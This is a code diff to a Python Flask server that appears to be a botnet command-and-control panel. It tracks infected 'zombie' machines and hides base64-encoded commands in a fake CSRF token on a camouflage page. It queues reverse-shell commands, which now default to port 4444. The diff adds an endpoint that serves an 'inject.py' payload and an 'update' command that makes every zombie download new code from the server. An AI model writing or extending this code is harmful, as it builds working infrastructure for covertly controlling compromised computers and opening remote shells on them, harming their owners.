@@ -1,13 +1,11 @@
 import hashlib
 import json
-from base64 import b64decode, b64encode
-
-import datetime
-
 import os
+from base64 import b64decode, b64encode
 from queue import Queue, Empty
 
-from flask import Flask, render_template, request, jsonify
+import datetime
+from flask import Flask, render_template, request, jsonify, Response
 from peewee import IntegrityError, DoesNotExist
 
 from models import Zombie, db_init
@@ -18,10 +16,29 @@ hidden_command = '<input name=_csrf_token type=hidden ' \
                  'value="{}"> '
 camo_html = 'camo.html'
 
+dl_key = ''
+valid = 0
+SERVER_URL = 'http://dev-4.lan/'
+
 
 @app.route("/")
 def index():
     pass
+
+
+@app.route("/dl/<key>")
+def download(key):
+    global dl_key
+    global valid
+    if key == dl_key:
+        valid -= 1
+        if not valid:
+            dl_key = random_string(6)
+            valid = 1
+        print("dl key is", dl_key)
+        with open('inject.py', 'rb') as f:
+            return Response(f.read(), mimetype='text/plain',
+                            headers={'Content-Disposition': 'attachment;'})
 
 
 @app.route("/api", methods=['GET', 'POST'])
@@ -30,15 +47,21 @@ def api():
         if request.form['cmd'] == 'reverse':
             cmd = {'cmd': 'reverse', 'inet': int(request.form.get('inet', 2)),
                    'type': int(request.form.get('type', 1)), 'host': request.form['host'],
-                   'port': int(request.form['port'])
+                   'port': int(request.form.get('port', 4444))
                    }
+        elif request.form['cmd'] == 'update':
+            cmd = {'cmd': 'update', 'url': request.form.get('url', SERVER_URL + "dl/" + dl_key)}
+            global valid
+            valid = len(Zombie.select())
+        if cmd:
             if request.form.get('who', 'all') == 'all':
                 for z in Zombie.select():
                     messages[z.id].put(cmd)
             else:
-                messages[request.form['who']].put(cmd)
+                messages[int(request.form['who'])].put(cmd)
         return '', 204
-    return jsonify([z.get_dict() for z in Zombie.select()])
+    return jsonify({'dl_key': dl_key,
+                    'zombies': [z.get_dict() for z in Zombie.select()]})
 
 
 def gen_uuid(form) -> str:
@@ -67,7 +90,7 @@ def check_in():
             cmd = messages[z.id].get_nowait()
             return render_template(camo_html, command=hidden_command.format(
                 b64encode(json.dumps(cmd).encode()).decode()))
-        except Empty:
+        except (Empty, KeyError):
             pass
     return render_template(camo_html, command=hidden_command.format(random_string()))
 
@@ -90,6 +113,11 @@ def register():
 
 if __name__ == "__main__":
     db_init()
+    global dl_key
+    dl_key = random_string(6)
+    global valid
+    valid = 1
+    print("dl key is", dl_key)
     messages = {}
     for z in Zombie.select():
         messages[z.id] = Queue()
